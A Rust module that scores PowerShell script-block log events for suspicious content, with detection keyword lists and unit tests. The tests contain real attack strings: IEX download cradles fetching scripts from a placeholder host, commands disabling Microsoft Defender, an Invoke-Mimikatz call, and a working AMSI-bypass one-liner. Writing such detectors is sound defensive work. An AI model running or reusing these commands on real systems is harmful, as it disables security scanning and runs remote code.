//! Severity of PowerShell script blocks (`Microsoft-Windows-PowerShell`
//! event 4104).
//!
//! Script block logging records every block PowerShell compiles, most of it
//! PowerShell's own module code, so a block is `Info` unless something in it
//! is suspicious. Suspicious blocks carry rule metadata, so they show up as
//! detections:
//!
//! - TF-PS-001 (Medium; High for known offensive tooling): PowerShell itself
//!   marked the block suspicious (it logs those at the Warning level), or the
//!   content downloads or decodes code and runs it, loads an assembly from
//!   memory, uses process memory/injection APIs, weakens Microsoft Defender,
//!   or names known offensive tooling.
//! - TF-PS-002 (High): the content touches AMSI internals that are used to
//!   switch off script scanning.
//!
//! Matching is case-insensitive substring matching on the block's text.
//! Large scripts are logged in parts, and each part is assessed on its own.

use crate::events::{Confidence, MitreRef, RuleMetadata, Severity};

/// ETW level of script blocks PowerShell itself considers suspicious
/// (`TRACE_LEVEL_WARNING`). Ordinary blocks are logged at Verbose (5).
pub const POWERSHELL_WARNING_LEVEL: u8 = 3;

#[derive(Debug)]
pub struct Assessment {
    pub severity: Severity,
    pub rule: Option<RuleMetadata>,
}

struct Indicator {
    description: &'static str,
    /// One of these must occur...
    any: &'static [&'static str],
    /// ...and, when not empty, one of these as well.
    with_any: &'static [&'static str],
    /// Raises the block to High.
    high: bool,
}

/// Running code that the script produced at run time.
const RUNS_CODE: &[&str] = &[
    "invoke-expression",
    "iex(",
    "iex (",
    "|iex",
    "| iex",
    "iex $",
    "[scriptblock]::create(",
];

const INDICATORS: &[Indicator] = &[
    Indicator {
        description: "downloads code and runs it",
        any: &[
            "downloadstring(",
            "downloaddata(",
            "net.webclient",
            "invoke-webrequest",
            "invoke-restmethod",
            "start-bitstransfer",
        ],
        with_any: RUNS_CODE,
        high: false,
    },
    Indicator {
        description: "decodes Base64 and runs it",
        any: &["frombase64string("],
        with_any: RUNS_CODE,
        high: false,
    },
    Indicator {
        description: "loads an assembly from memory",
        any: &[
            "reflection.assembly]::load(",
            "[appdomain]::currentdomain.load(",
        ],
        with_any: &[],
        high: false,
    },
    Indicator {
        description: "uses process memory or injection APIs",
        any: &[
            "virtualalloc",
            "writeprocessmemory",
            "createremotethread",
            "getdelegateforfunctionpointer",
        ],
        with_any: &[],
        high: false,
    },
    Indicator {
        description: "weakens Microsoft Defender",
        any: &["set-mppreference", "add-mppreference"],
        with_any: &["-disable", "-exclusion"],
        high: false,
    },
    Indicator {
        description: "names known offensive tooling",
        any: &[
            "invoke-mimikatz",
            "invoke-shellcode",
            "invoke-reflectivepeinjection",
            "powersploit",
            "invoke-kerberoast",
            "invoke-bloodhound",
            "invoke-tokenmanipulation",
            "get-gpppassword",
        ],
        with_any: &[],
        high: true,
    },
];

/// AMSI internals referenced by in-process AMSI bypasses.
const AMSI_TAMPERING: &[&str] = &[
    "amsiutils",
    "amsiinitfailed",
    "amsiscanbuffer",
    "amsicontext",
];

/// Assess one script block. `powershell_flagged`: PowerShell logged it at
/// [`POWERSHELL_WARNING_LEVEL`].
pub fn assess(content: &str, powershell_flagged: bool) -> Assessment {
    let text = content.to_ascii_lowercase();

    let amsi: Vec<String> = AMSI_TAMPERING
        .iter()
        .filter(|name| text.contains(*name))
        .map(|name| format!("references {name}"))
        .collect();
    if !amsi.is_empty() {
        return Assessment {
            severity: Severity::High,
            rule: Some(RuleMetadata {
                id: "TF-PS-002".into(),
                name: "AMSI tampering in PowerShell".into(),
                description: "A PowerShell script block references AMSI internals that are used to switch off script scanning.".into(),
                mitre: MitreRef {
                    tactic: "Defense Evasion".into(),
                    technique_id: "T1562.001".into(),
                    technique_name: "Impair Defenses: Disable or Modify Tools".into(),
                },
                confidence: Confidence::High,
                evidence: amsi,
            }),
        };
    }

    let mut evidence = Vec::new();
    if powershell_flagged {
        evidence.push("PowerShell marked the script block as suspicious".to_string());
    }
    let mut content_hits = 0;
    let mut high = false;
    for indicator in INDICATORS {
        let Some(hit) = indicator.any.iter().find(|s| text.contains(*s)) else {
            continue;
        };
        if !indicator.with_any.is_empty() && !indicator.with_any.iter().any(|s| text.contains(s)) {
            continue;
        }
        evidence.push(format!(
            "{} ({})",
            indicator.description,
            hit.trim_end_matches('(')
        ));
        content_hits += 1;
        high |= indicator.high;
    }
    if evidence.is_empty() {
        return Assessment {
            severity: Severity::Info,
            rule: None,
        };
    }

    let (severity, confidence) = if high {
        (Severity::High, Confidence::High)
    } else if content_hits > 0 {
        (Severity::Medium, Confidence::Medium)
    } else {
        // Only PowerShell's own heuristic, which also flags common
        // administrative code (Add-Type, P/Invoke).
        (Severity::Medium, Confidence::Low)
    };
    Assessment {
        severity,
        rule: Some(RuleMetadata {
            id: "TF-PS-001".into(),
            name: "Suspicious PowerShell script block".into(),
            description:
                "A PowerShell script block contains code commonly used by attackers (see evidence)."
                    .into(),
            mitre: MitreRef {
                tactic: "Execution".into(),
                technique_id: "T1059.001".into(),
                technique_name: "Command and Scripting Interpreter: PowerShell".into(),
            },
            confidence,
            evidence,
        }),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rule_id(a: &Assessment) -> Option<&str> {
        a.rule.as_ref().map(|r| r.id.as_str())
    }

    #[test]
    fn ordinary_blocks_are_info() {
        for content in [
            "#requires -version 3.0\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }",
            "Get-ChildItem C:\\Users\\Public | Select-Object Name",
            "$bytes = [Convert]::FromBase64String($s); [IO.File]::WriteAllBytes($p, $bytes)",
            "Invoke-WebRequest -Uri $u -OutFile $f",
            "Set-MpPreference -SignatureUpdateInterval 4",
            "",
        ] {
            let a = assess(content, false);
            assert!(matches!(a.severity, Severity::Info), "{content}");
            assert!(a.rule.is_none(), "{content}");
        }
    }

    #[test]
    fn download_or_decode_and_run_is_medium() {
        for content in [
            "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')",
            "$c = iwr http://x/a; Invoke-Expression $c.Content; Invoke-WebRequest x",
            "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))",
            "[ScriptBlock]::Create((Invoke-RestMethod http://x/s)).Invoke()",
        ] {
            let a = assess(content, false);
            assert!(matches!(a.severity, Severity::Medium), "{content}");
            assert_eq!(rule_id(&a), Some("TF-PS-001"), "{content}");
            assert!(matches!(a.rule.unwrap().confidence, Confidence::Medium));
        }
    }

    #[test]
    fn memory_loading_injection_and_defender_changes_are_medium() {
        for (content, evidence) in [
            (
                "[System.Reflection.Assembly]::Load($bytes)",
                "loads an assembly from memory",
            ),
            (
                "$f = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p, $t)",
                "injection APIs",
            ),
            (
                "Set-MpPreference -DisableRealtimeMonitoring $true",
                "weakens Microsoft Defender",
            ),
            (
                "Add-MpPreference -ExclusionPath C:\\tools",
                "weakens Microsoft Defender",
            ),
        ] {
            let a = assess(content, false);
            assert!(matches!(a.severity, Severity::Medium), "{content}");
            let rule = a.rule.expect(content);
            assert!(
                rule.evidence.iter().any(|e| e.contains(evidence)),
                "{:?}",
                rule.evidence
            );
        }
    }

    #[test]
    fn offensive_tooling_is_high() {
        let a = assess("Invoke-Mimikatz -DumpCreds", false);
        assert!(matches!(a.severity, Severity::High));
        let rule = a.rule.unwrap();
        assert_eq!(rule.id, "TF-PS-001");
        assert!(matches!(rule.confidence, Confidence::High));
        assert_eq!(
            rule.evidence,
            ["names known offensive tooling (invoke-mimikatz)"]
        );
    }

    #[test]
    fn amsi_tampering_has_its_own_rule() {
        let bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
        let a = assess(bypass, true);
        assert!(matches!(a.severity, Severity::High));
        let rule = a.rule.unwrap();
        assert_eq!(rule.id, "TF-PS-002");
        assert_eq!(rule.mitre.technique_id, "T1562.001");
        assert_eq!(
            rule.evidence,
            ["references amsiutils", "references amsiinitfailed"]
        );
    }

    #[test]
    fn powershell_flag_alone_is_medium_with_low_confidence() {
        let a = assess("Add-Type -TypeDefinition $code", true);
        assert!(matches!(a.severity, Severity::Medium));
        let rule = a.rule.unwrap();
        assert!(matches!(rule.confidence, Confidence::Low));
        assert_eq!(
            rule.evidence,
            ["PowerShell marked the script block as suspicious"]
        );
    }

    #[test]
    fn indicators_combine_in_the_evidence() {
        let a = assess(
            "$k = VirtualAlloc(0, 4096, 0x3000, 0x40); IEX (New-Object Net.WebClient).DownloadString($u)",
            true,
        );
        let rule = a.rule.unwrap();
        assert_eq!(rule.evidence.len(), 3, "{:?}", rule.evidence);
        assert!(matches!(rule.confidence, Confidence::Medium));
    }
}
